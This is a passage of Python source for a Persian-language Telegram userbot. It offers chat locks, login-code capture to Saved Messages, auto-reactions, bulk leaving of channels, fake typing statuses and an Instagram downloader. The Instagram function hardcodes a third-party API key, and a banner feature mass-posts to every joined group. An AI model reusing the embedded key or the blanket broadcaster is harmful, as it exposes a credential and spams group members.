@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد روشن$"))
async def lock_forward_on_command(client, message):
    lock_settings["فوروارد"] = True
    await message.edit("✅ **قفل فوروارد فعال شد**\n\nارسال پیام فورواردی در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("فوروارد", prefixes="") & filters.regex(r"^فوروارد خاموش$"))
async def lock_forward_off_command(client, message):
    lock_settings["فوروارد"] = False
    await message.edit("✅ **قفل فوروارد غیرفعال شد**")

@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس روشن$"))
async def lock_voice_on_command(client, message):
    lock_settings["ویس"] = True
    await message.edit("✅ **قفل ویس فعال شد**\n\nارسال ویس در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("ویس", prefixes="") & filters.regex(r"^ویس خاموش$"))
async def lock_voice_off_command(client, message):
    lock_settings["ویس"] = False
    await message.edit("✅ **قفل ویس غیرفعال شد**")

@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام روشن$"))
async def lock_text_on_command(client, message):
    lock_settings["پیام"] = True
    await message.edit("✅ **قفل پیام فعال شد**\n\nارسال پیام متنی در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("پیام", prefixes="") & filters.regex(r"^پیام خاموش$"))
async def lock_text_off_command(client, message):
    lock_settings["پیام"] = False
    await message.edit("✅ **قفل پیام غیرفعال شد**")

@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل روشن$"))
async def lock_file_on_command(client, message):
    lock_settings["فایل"] = True
    await message.edit("✅ **قفل فایل فعال شد**\n\nارسال فایل در پیوی حذف خواهد شد.")

@app.on_message(filters.me & filters.command("فایل", prefixes="") & filters.regex(r"^فایل خاموش$"))
async def lock_file_off_command(client, message):
    lock_settings["فایل"] = False
    await message.edit("✅ **قفل فایل غیرفعال شد**")

@app.on_message(filters.me & filters.command("وضعیت قفل", prefixes="") & filters.regex(r"^وضعیت قفل$"))
async def lock_status_command(client, message):
    status_text = "🔒 **وضعیت قفل‌های پیوی**\n\n"
    
    for lock_type, status in lock_settings.items():
        emoji = "🔴" if status else "🟢"
        persian_status = "قفل" if status else "آزاد"
        status_text += f"{emoji} **{lock_type}**: {persian_status}\n"
    
    status_text += f"\n📊 **تعداد قفل‌های فعال:** {sum(lock_settings.values())} از {len(lock_settings)}"
    
    await message.edit(status_text)

@app.on_message(filters.me & filters.command("ریست قفل", prefixes="") & filters.regex(r"^ریست قفل$"))
async def reset_lock_command(client, message):
    for key in lock_settings:
        lock_settings[key] = False
    
    await message.edit("✅ **همه قفل‌ها ریست شدند**\n\nهمه دسترسی‌ها آزاد شدند.")

@app.on_message(filters.me & filters.command("راهنمای قفل", prefixes="") & filters.regex(r"^راهنمای قفل$"))
async def lock_help_command(client, message):
    help_text = """
🛡️✨ **مرکز کنترل قفل‌های پیوی**

╭───────◆◇◆───────╮
      🔒 کنترل حرفه‌ای حریم خصوصی
╰───────◆◇◆───────╯

📘 **شرح کوتاه:**  
با این دستورات می‌تونی تمام پیام‌ها، مدیاها و تعاملات داخل پیوی رو مدیریت و محدود کنی.

━━━━━━━━━━━━━━━━━━

🌐 **بخش ۱ — قفل‌های کلی**
• `همه روشن` ➜ فعال‌سازی کامل قفل‌ها  
• `همه خاموش` ➜ آزادسازی کامل  

━━━━━━━━━━━━━━━━━━

🎨 **بخش ۲ — مدیا و استیکر**
• `مدیا روشن` ➜ بستن عکس، ویدیو و مدیا  
• `مدیا خاموش` ➜ آزادسازی مدیا  
• `استیکر روشن` ➜ قفل استیکر و گیف  
• `استیکر خاموش` ➜ آزادسازی استیکر  

━━━━━━━━━━━━━━━━━━

🔁 **بخش ۳ — فوروارد و متن**
• `فوروارد روشن` ➜ جلوگیری از فوروارد  
• `فوروارد خاموش` ➜ آزادسازی فوروارد  
• `پیام روشن` ➜ قفل پیام‌های متنی  
• `پیام خاموش` ➜ مجاز کردن متن‌ها  

━━━━━━━━━━━━━━━━━━

🎧 **بخش ۴ — صدا و فایل**
• `ویس روشن` ➜ قفل ویس  
• `ویس خاموش` ➜ آزادسازی ویس  
• `فایل روشن` ➜ قفل فایل‌ها  
• `فایل خاموش` ➜ آزادسازی فایل  

━━━━━━━━━━━━━━━━━━

📊 **بخش ۵ — مدیریت وضعیت**
• `وضعیت قفل` ➜ نمایش وضعیت فعلی  
• `ریست قفل` ➜ بازگردانی به حالت اولیه  

━━━━━━━━━━━━━━━━━━

💡 **نمونه استفاده:**  
`همه روشن`  
"""
    await message.edit(help_text)

@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین روشن$"))
async def enable_anti_login(client, message):
    global anti_login_enabled
    anti_login_enabled = True
    await message.edit("""✅ **انتی لاگین فعال شد**

🛡️ **قابلیت‌ها:**
• شناسایی پیام‌های کد ورود از 777000
• استخراج خودکار کدهای ورود  
• ذخیره کدها در پیام‌های ذخیره شده
• حذف پیام اصلی برای امنیت

📱 **کدها در Saved Messages ذخیره می‌شوند**""")

@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین خاموش$"))
async def disable_anti_login(client, message):
    global anti_login_enabled
    anti_login_enabled = False
    await message.edit("✅ **انتی لاگین غیرفعال شد**")

@app.on_message(filters.me & filters.command("انتی لاگین", prefixes="") & filters.regex(r"^انتی لاگین$"))
async def check_anti_login(client, message):
    status = "فعال ✅" if anti_login_enabled else "غیرفعال ❌"
    
    status_text = f"""🛡️ **وضعیت انتی لاگین:** {status}

{"📱 **سیستم فعال است** - کدهای ورود ذخیره می‌شوند" if anti_login_enabled else "🔓 **سیستم غیرفعال است** - پیام‌ها دست‌نخورده باقی می‌مانند"}"""

    await message.edit(status_text)

@app.on_message(filters.me & filters.regex(r'^ریکت\s+(.+)$'))
async def set_reaction_command(client, message):
    match = message.matches[0] if message.matches else None
    if not match:
        await message.edit("❌ **فرمت دستور اشتباه است**")
        return
    
    reaction_emoji = match.group(1).strip()
    if not reaction_emoji:
        await message.edit("""✨ **سیستم ریکشن خودکار**

📌 **استفاده:**
• `ریکت 😊` (ریپلای روی پیام کاربر)
• `ریکت 😊 @username`

📌 **دستورات دیگر:**
• `حذف ریکت` (ریپلای یا یوزرنیم)
• `لیست ریکت`
• `پاکسازی ریکت`""")
        return
    if message.reply_to_message and message.reply_to_message.from_user:
        user_id = message.reply_to_message.from_user.id
        user_name = f"{message.reply_to_message.from_user.first_name or ''} {message.reply_to_message.from_user.last_name or ''}".strip() or "کاربر"
        auto_reactions[str(user_id)] = reaction_emoji
        save_reactions()
        await message.edit(f"""✅ **ریکشن ثبت شد**
👤 **کاربر:** {user_name}
🆔 **آیدی:** `{user_id}`
🎭 **ریکشن:** {reaction_emoji}""")
        return
    parts = reaction_emoji.split()
    if len(parts) > 1:
        emoji = parts[0]
        username = parts[1].lstrip('@')
        try:
            user = await client.get_users(username)
            user_id = user.id
            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "کاربر"
            auto_reactions[str(user_id)] = emoji
            save_reactions()
            await message.edit(f"""✅ **ریکشن ثبت شد**
👤 **کاربر:** {user_name}
🆔 **آیدی:** `{user_id}`
🎭 **ریکشن:** {emoji}""")
        except Exception as e:
            await message.edit(f"❌ **کاربر یافت نشد**\n`{str(e)}`")
        return
    await message.edit("❌ **روی پیام کاربر ریپلای کنید یا یوزرنیم وارد کنید**\n\nمثال:\n`ریکت 👍` (با ریپلای)\n`ریکت 👍 @username`")
@app.on_message(filters.me & filters.regex(r'^لیست ریکت$'))
async def list_reactions_command(client, message):
    if not auto_reactions:
        await message.edit("❌ **هیچ ریکشنی ثبت نشده**")
        return
    
    list_text = "📜 **لیست ریکشن‌های خودکار**\n\n"
    for user_id, reaction in auto_reactions.items():
        try:
            user = await client.get_users(int(user_id))
            user_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or user.username or "بدون نام"
            list_text += f"👤 **{user_name}**\n?? `{user_id}` → {reaction}\n"
            list_text += "─" * 30 + "\n"
        except:
            list_text += f"👤 کاربر نامشخص\n🆔 `{user_id}` → {reaction}\n"
            list_text += "─" * 30 + "\n"
    
    list_text += f"\n📊 **تعداد:** {len(auto_reactions)} ریکشن"
    await message.edit(list_text)

@app.on_message(filters.me & filters.regex(r'^پاکسازی ریکت$'))
async def clear_reactions_command(client, message):
    if not auto_reactions:
        await message.edit("❌ **هیچ ریکشنی برای پاکسازی وجود ندارد**")
        return
    
    reaction_count = len(auto_reactions)
    auto_reactions.clear()
    save_reactions()
    
    await message.edit(f"✅ **لیست ریکشن‌ها پاکسازی شد**\n\n🗑️ **تعداد حذف شده:** {reaction_count} ریکشن")

@app.on_message(filters.me & filters.command("لیست فحش", prefixes=""))
async def insult_list_command(client: Client, message: Message):
    insults_list = load_insults()
    if not insults_list:
        return await message.edit("❌ **لیست فحش‌ها خالی است**")    
    try:
        loading_msg = await message.edit("🔄 **در حال دریافت لیست فحش‌ها...**")        
        list_text = f"💢 **لیست فحش‌ها - تعداد: {len(insults_list)}**\n\n"        
        for i, insult in enumerate(insults_list, 1):
            list_text += f"{i}. {insult}\n"
            if len(list_text) > 3500:
                await loading_msg.edit(list_text)
                list_text = f"💢 **ادامه لیست فحش‌ها**\n\n"
                loading_msg = await message.reply("🔄 **در حال ادامه لیست...**")
        
        if len(list_text) > 0:
            await loading_msg.edit(list_text)
            
    except Exception as e:
        await message.edit(f"❌ **خطا در دریافت لیست فحش‌ها:**\n`{e}`")

@app.on_message(filters.me & filters.command("ویرایش", prefixes="") & filters.regex(r"^ویرایش .+ به .+$"))
async def quick_edit_command(client: Client, message: Message):
    try:
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیامی که می‌خواهید ویرایش کنید ریپلای کنید**")
            return
        command_parts = message.text.split()
        if len(command_parts) != 4:
            await message.edit("❌ **فرمت نادرست!**\n\n**فرمت صحیح:**\n`ویرایش کلمه_قدیمی به کلمه_جدید`\n\n**مثال:**\n`ویرایش سلان به سلام`")
            return        
        old_word = command_parts[1]
        separator = command_parts[2]
        new_word = command_parts[3]
        if separator != "به":
            await message.edit("❌ **از کلمه 'به' به عنوان جداکننده استفاده کنید**\n\n**مثال:**\n`ویرایش سلان به سلام`")
            return        
        replied_message = message.reply_to_message
        old_text = replied_message.text or replied_message.caption or ""
        if old_word not in old_text:
            await message.edit(f"❌ **کلمه '{old_word}' در پیام یافت نشد**")
            return
        new_text = old_text.replace(old_word, new_word)
        await client.edit_message_text(
            chat_id=replied_message.chat.id,
            message_id=replied_message.id,
            text=new_text
        )
        await message.delete()        
    except Exception as e:
        await message.edit(f"❌ **خطا در ویرایش:**\n`{str(e)}`")
@app.on_message(filters.me & filters.command("تنظیم بنر", prefixes="") & filters.regex(r"^تنظیم بنر$"))
async def set_banner_command(client: Client, message: Message):
    global banner_counter
    
    try:
        if not message.reply_to_message:
            await message.edit("❌ **لطفا روی پیامی که می‌خواهید به عنوان بنر ثبت کنید ریپلای کنید**")
            return
        
        replied_message = message.reply_to_message
        banner_id = banner_counter
        banner_counter += 1
        banners[banner_id] = {
            'message': replied_message,
            'text': replied_message.text or replied_message.caption or "",
            'media': replied_message.media,
            'created_at': datetime.now()
        }
        
        await message.edit(f"✅ **بنر با موفقیت ثبت شد**\n\n🆔 **کد بنر:** `{banner_id}`")
        
    except Exception as e:
        await message.edit(f"❌ **خطا در ثبت بنر:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("بنر همگانی", prefixes="") & filters.regex(r"^بنر همگانی \d+$"))
async def start_broadcast_command(client: Client, message: Message):
    try:
        banner_id = int(message.command[1])
        
        if banner_id not in banners:
            await message.edit("❌ **کد بنر یافت نشد**")
            return
        active_broadcasts['global'] = {
            'banner_id': banner_id,
            'running': True,
            'start_time': datetime.now()
        }
        
        await message.edit("✅ **بنر همگانی فعال شد**\n\n🔄 ارسال بنر به گروه‌ها و سوپرگروه‌ها شروع شد")
        asyncio.create_task(send_global_banner(client, banner_id))
        
    except Exception as e:
        await message.edit(f"❌ **خطا در فعال‌سازی بنر:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("لیست بنرها", prefixes="") & filters.regex(r"^لیست بنرها$"))
async def list_banners_command(client: Client, message: Message):
    try:
        if not banners:
            await message.edit("❌ **هیچ بنری ثبت نشده است**")
            return
        
        list_text = "📋 **لیست بنرها**\n\n"
        
        for banner_id, banner_data in banners.items():
            created_time = banner_data['created_at'].strftime("%Y-%m-%d %H:%M")
            preview = banner_data['text'][:50] + "..." if len(banner_data['text']) > 50 else banner_data['text']
            
            list_text += f"🆔 **کد:** `{banner_id}`\n"
            list_text += f"📝 **پیش‌نمایش:** {preview}\n"
            list_text += f"⏰ **زمان ثبت:** {created_time}\n"
            list_text += "─" * 30 + "\n"
        
        await message.edit(list_text)
        
    except Exception as e:
        await message.edit(f"❌ **خطا در نمایش لیست:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("بنر همگانی خاموش", prefixes="") & filters.regex(r"^بنر همگانی خاموش$"))
async def stop_broadcast_command(client: Client, message: Message):
    try:
        if 'global' in active_broadcasts:
            active_broadcasts['global']['running'] = False
            await message.edit("✅ **بنر همگانی خاموش شد**")
        else:
            await message.edit("❌ **بنر همگانی فعال نیست**")
            
    except Exception as e:
        await message.edit(f"❌ **خطا در خاموش کردن بنر:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("بنر ارسال", prefixes="") & filters.regex(r"^بنر ارسال \d+$"))
async def instant_broadcast_command(client: Client, message: Message):
    try:
        banner_id = int(message.command[1]) 
        
        if banner_id not in banners:
            await message.edit("❌ **کد بنر یافت نشد**")
            return
        
        await message.edit("🔄 **شروع ارسال فوری بنر...**")
        asyncio.create_task(send_instant_broadcast(client, banner_id))
        
    except Exception as e:
        await message.edit(f"❌ **خطا در ارسال بنر:**\n`{str(e)}`")
        
@app.on_message(filters.me & filters.command("حذف بنر", prefixes="") & filters.regex(r"^حذف بنر \d+$"))
async def delete_banner_command(client: Client, message: Message):
    try:
        banner_id = int(message.command[1])
        
        if banner_id not in banners:
            await message.edit("❌ **کد بنر یافت نشد**\n\n📋 برای مشاهده لیست بنرها: `لیست بنرها`")
            return
        del banners[banner_id]
        
        await message.edit(f"✅ **بنر با موفقیت حذف شد**\n\n🆔 **کد بنر:** `{banner_id}`")
        
    except ValueError:
        await message.edit("❌ **لطفا یک عدد معتبر وارد کنید**\n\nمثال: `حذف بنر 1`")
    except Exception as e:
        await message.edit(f"❌ **خطا در حذف بنر:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("پاکسازی بنر ها", prefixes="") & filters.regex(r"^پاکسازی بنرها$"))
async def clear_all_banners_command(client: Client, message: Message):
    try:
        if not banners:
            await message.edit("❌ **هیچ بنری برای پاکسازی وجود ندارد**")
            return
        
        count = len(banners)
        banners.clear()
        
        await message.edit(f"✅ **همه بنرها پاکسازی شدند**\n\n🗑️ **تعداد حذف شده:** {count} بنر")
        
    except Exception as e:
        await message.edit(f"❌ **خطا در پاکسازی بنرها:**\n`{str(e)}`")
@app.on_message(filters.me & filters.command("زمان بنر", prefixes="") & filters.regex(r"^زمان بنر \d+$"))
async def set_banner_time_command(client: Client, message: Message):
    try:
        minutes = int(message.command[1]) 
        active_broadcasts['delay'] = minutes * 60 
        
        await message.edit(f"✅ **زمان بنر تنظیم شد:** {minutes} دقیقه")
        
    except Exception as e:
        await message.edit(f"❌ **خطا در تنظیم زمان:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("فرمت", prefixes=""))
async def format_command(client, message):
    if len(message.command) < 2:
        status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
        
        for format_name, is_active in format_settings.items():
            emoji = "🟢" if is_active else "🔴"
            status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
        
        status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"
        
        await message.edit(f"""
{status_text}

📝 <b>دستورات فرمت:</b>
<code>فرمت بولد روشن</code>
<code>فرمت بولد خاموش</code>
<code>فرمت ایتالیک روشن</code>
<code>فرمت ایتالیک خاموش</code>
<code>فرمت زیرخط روشن</code>
<code>فرمت زیرخط خاموش</code>
<code>فرمت خط‌خورده روشن</code>  ← ✅ با نیم‌فاصله
<code>فرمت خط‌خورده خاموش</code>  ← ✅ با نیم‌فاصله
<code>فرمت اسپویلر روشن</code>
<code>فرمت اسپویلر خاموش</code>
<code>فرمت کد روشن</code>
<code>فرمت کد خاموش</code>
<code>فرمت پیش‌فرمت روشن</code>
<code>فرمت پیش‌فرمت خاموش</code>
<code>فرمت نقل‌قول روشن</code>
<code>فرمت نقل‌قول خاموش</code>

🔧 <b>سایر دستورات:</b>
<code>فرمت وضعیت</code> - نمایش وضعیت
<code>فرمت ریست</code> - غیرفعال کردن همه
""", parse_mode=enums.ParseMode.HTML)
        return
    
    if len(message.command) == 2:
        sub_command = message.command[1]
        if sub_command == "وضعیت":
            status_text = "🎨 <b>وضعیت فرمت‌ها</b>\n\n"
            
            for format_name, is_active in format_settings.items():
                emoji = "🟢" if is_active else "🔴"
                status_text += f"{emoji} <b>{format_name}</b>: {'فعال' if is_active else 'غیرفعال'}\n"
            
            status_text += f"\n📊 <b>فرمت‌های فعال:</b> {sum(format_settings.values())} از {len(format_settings)}"
            await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
            return
        elif sub_command == "ریست":
            for format_name in format_settings:
                format_settings[format_name] = False
            await message.edit("✅ <b>همه فرمت‌ها غیرفعال شدند</b>", parse_mode=enums.ParseMode.HTML)
            return
    
    if len(message.command) == 3:
        format_name = message.command[1]
        action = message.command[2]
        
        name_mapping = {
            "بولد": "بولد",
            "ایتالیک": "ایتالیک",
            "زیرخط": "زیرخط",
            "خط‌خورده": "خط خورده", 
            "اسپویلر": "اسپویلر",
            "کد": "کد",
            "پیش‌فرمت": "پیش‌فرمت",
            "نقل‌قول": "نقل‌قول",
        }
        
        correct_name = name_mapping.get(format_name, format_name)

        if correct_name in format_settings:
            if action == "روشن":
                format_settings[correct_name] = True
                if correct_name == "خط خورده":
                    sample_text = "<s>این یک متن نمونه است</s>"
                else:
                    sample_text = html_tags[correct_name].format("این یک متن نمونه است")
                await message.edit(f"✅ <b>فرمت {correct_name} فعال شد</b>\n\n📝 <b>نمونه:</b> {sample_text}", parse_mode=enums.ParseMode.HTML)
            elif action == "خاموش":
                format_settings[correct_name] = False
                await message.edit(f"✅ <b>فرمت {correct_name} غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)
            else:
                await message.edit("❌ <b>دستور نامعتبر</b>\n\n💡 از <code>روشن</code> یا <code>خاموش</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
        else:
            await message.edit(f"❌ <b>فرمت '{format_name}' یافت نشد</b>\n\n💡 فرمت‌های معتبر:\n{', '.join(format_settings.keys())}", parse_mode=enums.ParseMode.HTML)
    else:
        await message.edit("❌ <b>فرمت دستور نادرست</b>\n\n💡 از <code>فرمت</code> برای مشاهده راهنما استفاده کنید", parse_mode=enums.ParseMode.HTML)

@app.on_message(filters.me & filters.command("تعداد کانال ها", prefixes=""))
async def channels_count_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**📊 در حال شمارش کانال‌ها...**")
        
        channels_count = 0
        channels_list = []
        
        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.CHANNEL:
                channels_count += 1
                channels_list.append(dialog.chat.title)
        
        result_text = f"""**📈 آمار کانال‌ها**

📊 **تعداد کل کانال‌ها:** `{channels_count}`
        
📋 **لیست کانال‌ها:**
"""
        for i, channel in enumerate(channels_list[:20], 1):
            result_text += f"{i}. {channel}\n"
        
        if len(channels_list) > 20:
            result_text += f"\n📝 و {len(channels_list) - 20} کانال دیگر..."
        
        await loading_msg.edit(result_text)
        
    except Exception as e:
        await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("تعداد گروه ها", prefixes=""))
async def groups_count_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**📊 در حال شمارش گروه‌ها...**")
        
        groups_count = 0
        supergroups_count = 0
        groups_list = []
        
        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.GROUP:
                groups_count += 1
                groups_list.append(f"?? {dialog.chat.title}")
            elif dialog.chat.type == enums.ChatType.SUPERGROUP:
                supergroups_count += 1
                groups_list.append(f"👑 {dialog.chat.title}")
        
        total_groups = groups_count + supergroups_count
        
        result_text = f"""**📈 آمار گروه‌ها**

📊 **تعداد کل گروه‌ها:** `{total_groups}`
• گروه‌های معمولی: `{groups_count}`
• سوپرگروه‌ها: `{supergroups_count}`

📋 **لیست گروه‌ها:**
"""
        for i, group in enumerate(groups_list[:20], 1):
            result_text += f"{i}. {group}\n"
        
        if len(groups_list) > 20:
            result_text += f"\n📝 و {len(groups_list) - 20} گروه دیگر..."
        
        await loading_msg.edit(result_text)
        
    except Exception as e:
        await message.edit(f"**❌ خطا در دریافت اطلاعات:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("خروج همه کانال", prefixes=""))
async def leave_all_channels_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**🔄 در حال دریافت لیست کانال‌ها...**")
        
        channels = []
        
        async for dialog in client.get_dialogs():
            if dialog.chat.type == enums.ChatType.CHANNEL:
                channels.append(dialog.chat)
        
        if not channels:
            return await loading_msg.edit("**❌ هیچ کانالی برای خروج پیدا نشد**")
        
        await loading_msg.edit(f"**🚪 در حال خروج از {len(channels)} کانال...**")
        
        success_count = 0
        failed_count = 0
        
        for i, channel in enumerate(channels, 1):
            try:
                await client.leave_chat(channel.id)
                success_count += 1
                await asyncio.sleep(4)
                
                if i % 5 == 0:
                    await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(channels)}")
                    
            except Exception as e:
                failed_count += 1
                print(f"خطا در خروج از {channel.title}: {e}")
        
        await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**

📊 **نتایج:**
• ✅ موفق: `{success_count}`
• ❌ ناموفق: `{failed_count}`
• 📊 کل کانال‌ها: `{len(channels)}`""")
        
    except Exception as e:
        await message.edit(f"**❌ خطا:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("خروج همه گروه", prefixes=""))
async def leave_all_groups_command(client: Client, message: Message):
    try:
        loading_msg = await message.edit("**🔄 در حال دریافت لیست گروه‌ها...**")
        
        groups = []
        
        async for dialog in client.get_dialogs():
            if dialog.chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                groups.append(dialog.chat)
        
        if not groups:
            return await loading_msg.edit("**❌ هیچ گروهی برای خروج پیدا نشد**")
        
        await loading_msg.edit(f"**🚪 در حال خروج از {len(groups)} گروه...**")
        
        success_count = 0
        failed_count = 0
        
        for i, group in enumerate(groups, 1):
            try:
                await client.leave_chat(group.id)
                success_count += 1
                await asyncio.sleep(4)
                
                if i % 3 == 0:
                    await loading_msg.edit(f"**🚪 در حال خروج...**\n\n✅ **موفق:** {success_count}\n❌ **ناموفق:** {failed_count}\n📊 **پیشرفت:** {i}/{len(groups)}")
                    
            except Exception as e:
                failed_count += 1
                print(f"خطا در خروج از {group.title}: {e}")
        
        await loading_msg.edit(f"""**✅ عملیات خروج کامل شد**

📊 **نتایج:**
• ✅ موفق: `{success_count}`
• ❌ ناموفق: `{failed_count}`
• 📊 کل گروه‌ها: `{len(groups)}`""")
        
    except Exception as e:
        await message.edit(f"**❌ خطا:**\n`{str(e)}`")

@app.on_message(filters.me & filters.command("اکشن", prefixes=""))
async def action_command(client: Client, message: Message):
    if len(message.command) == 1:
        active_actions = [name for name, status in action_settings.items() if status]
        
        actions_text = """🎭 <b>سیستم اکشن خودکار</b>
📊 <b>وضعیت فعلی:</b>
"""
        if active_actions:
            actions_text += f"✅ <b>فعال:</b> {', '.join([get_persian_action_name(name) for name in active_actions])}\n"
        else:
            actions_text += "❌ <b>هیچ اکشنی فعال نیست</b>\n"
        
        actions_text += """
🔧 <b>دستورات:</b>
<code>اکشن لیست</code> - نمایش لیست کامل اکشن‌ها
<code>اکشن [نام] روشن</code> - فعال کردن اکشن
<code>اکشن [نام] خاموش</code> - غیرفعال کردن اکشن
<code>اکشن وضعیت</code> - نمایش وضعیت دقیق
<code>اکشن ریست</code> - خاموش کردن همه اکشن‌ها

📝 <b>مثال:</b>
<code>اکشن تایپ روشن</code>
<code>اکشن اپلود فایل خاموش</code>
<code>اکشن وضعیت</code>
"""
        await message.edit(actions_text, parse_mode=enums.ParseMode.HTML)
        return
    
    sub_command = message.command[1]
    
    if sub_command == "لیست":
        actions_list = """🎭 <b>لیست کامل اکشن‌های تلگرام</b>

📝 <b>اکشن‌های متنی (نمایش به کاربر):</b>
• تایپ - ⌨️ در حال تایپ (Typing...)
• اپلود عکس - 📸 در حال آپلود عکس (Uploading photo...)
• ضبط ویس - ?? در حال ضبط ویس (Recording voice...)
• اپلود ویدیو - 🎥 در حال آپلود ویدیو (Uploading video...)
• اپلود فایل - 📄 در حال آپلود فایل (Uploading document...)
• ضبط ویدیو - 🎬 در حال ضبط ویدیو (Recording video...)
• اپلود ویس - 🎵 در حال آپلود ویس (Uploading voice...)
• اپلود ویدیو نوت - 📹 در حال آپلود ویدیو نوت (Uploading video note...)
• ضبط ویدیو نوت - 🎞️ در حال ضبط ویدیو نوت (Recording video note...)
• بازی - 🎮 در حال بازی (Playing...)
• انتخاب مخاطب - 👤 در حال انتخاب مخاطب (Choosing contact...)
• پیدا کردن موقعیت - 📍 در حال پیدا کردن موقعیت (Finding location...)
• انتخاب استیکر - 🎨 در حال انتخاب استیکر (Choosing sticker...)

💡 <b>نکته:</b>
وقتی کاربر پیام می‌فرستد، اکشن فعال نمایش داده می‌شود
اکشن‌ها در پیوی و گروه کار می‌کنند"""
        await message.edit(actions_list, parse_mode=enums.ParseMode.HTML)
    
    elif sub_command == "وضعیت":
        status_text = "📊 <b>وضعیت دقیق اکشن‌ها</b>\n\n"
        
        for action_name, is_active in action_settings.items():
            emoji = "🟢" if is_active else "🔴"
            persian_name = get_persian_action_name(action_name)
            status_text += f"{emoji} <b>{persian_name}</b>: {'فعال ✅' if is_active else 'غیرفعال ❌'}\n"
        
        active_count = sum(action_settings.values())
        status_text += f"\n📈 <b>آمار:</b> {active_count} از {len(action_settings)} اکشن فعال"
        
        await message.edit(status_text, parse_mode=enums.ParseMode.HTML)
    
    elif sub_command == "ریست":
        for key in action_settings:
            action_settings[key] = False
        
        await message.edit("✅ <b>همه اکشن‌ها خاموش شدند</b>", parse_mode=enums.ParseMode.HTML)    
    else:
        full_text = ' '.join(message.command[1:])
        if " روشن" in full_text:
            action_name_persian = full_text.replace(" روشن", "").strip()
            action_state = "روشن"
        elif " خاموش" in full_text:
            action_name_persian = full_text.replace(" خاموش", "").strip()
            action_state = "خاموش"
        else:
            await message.edit("❌ <b>فرمت دستور نادرست است</b>\n\nمثال: <code>اکشن اپلود عکس روشن</code>", parse_mode=enums.ParseMode.HTML)
            return
        action_name = get_english_action_name(action_name_persian)        
        if action_name not in action_settings:
            await message.edit(f"❌ <b>اکشن '{action_name_persian}' یافت نشد</b>\n\n📝 از دستور <code>اکشن لیست</code> استفاده کنید", parse_mode=enums.ParseMode.HTML)
            return
        
        if action_state == "روشن":
            action_settings[action_name] = True
            persian_name = get_persian_action_name(action_name)
            await message.edit(f"✅ <b>اکشن '{persian_name}' فعال شد</b>\n\nاز این به بعد وقتی کاربران پیام می‌فرستند، اکشن '{persian_name}' نمایش داده می‌شود.", parse_mode=enums.ParseMode.HTML)
        
        elif action_state == "خاموش":
            action_settings[action_name] = False
            persian_name = get_persian_action_name(action_name)
            await message.edit(f"✅ <b>اکشن '{persian_name}' غیرفعال شد</b>", parse_mode=enums.ParseMode.HTML)

@app.on_message(filters.me & filters.command("اینستا", prefixes=""))
async def instagram_download_command(client: Client, message: Message):
    try:
        if len(message.command) < 2:
            await message.edit("""
📥 **دستور دانلود اینستاگرام**

📝 **استفاده:**
`اینستا [لینک پست یا ریل]`

📌 **مثال‌ها:**

`اینستا https://www.instagram.com/reel/DOkym3fCFqg/`

`اینستا https://www.instagram.com/p/CzuF4KQqJ7q/`

""")
            return        
        url = message.command[1].strip()
        if not url.startswith(("https://www.instagram.com/", "https://instagram.com/")):
            await message.edit("❌ **لینک نامعتبر!**\nلطفا لینک معتبر اینستاگرام وارد کنید.")
            return
        if "/stories/" in url or "/story/" in url:
            await message.edit("❌ **این دستور فقط برای پست‌ها و ریل‌ها کار می‌کند!**\nلینک استوری پشتیبانی نمی‌شود.")
            return        
        loading_msg = await message.edit("🔄 **در حال دریافت اطلاعات از اینستاگرام...**")
        api_key = "8000978149:uJC3mxBncq9ELPN@Api_ManagerRoBot"
        api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={url}"        
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            import urllib.parse
            encoded_url = urllib.parse.quote(url, safe='')
            final_api_url = f"https://api.fast-creat.ir/instagram?apikey={api_key}&type=post&url={encoded_url}"            
            response = requests.get(final_api_url, headers=headers, timeout=45)
            print(f"Status Code: {response.status_code}")
            print(f"Response: {response.text[:500]}")
            if response.status_code != 200:
                await loading_msg.edit(f"❌ **خطا در اتصال به سرور**\nکد خطا: {response.status_code}")
                return
            try:
                data = response.json()
            except json.JSONDecodeError as e:
                await loading_msg.edit(f"❌ **پاسخ JSON نامعتبر**\n{str(e)}")
                return
            if not data.get("ok", False):
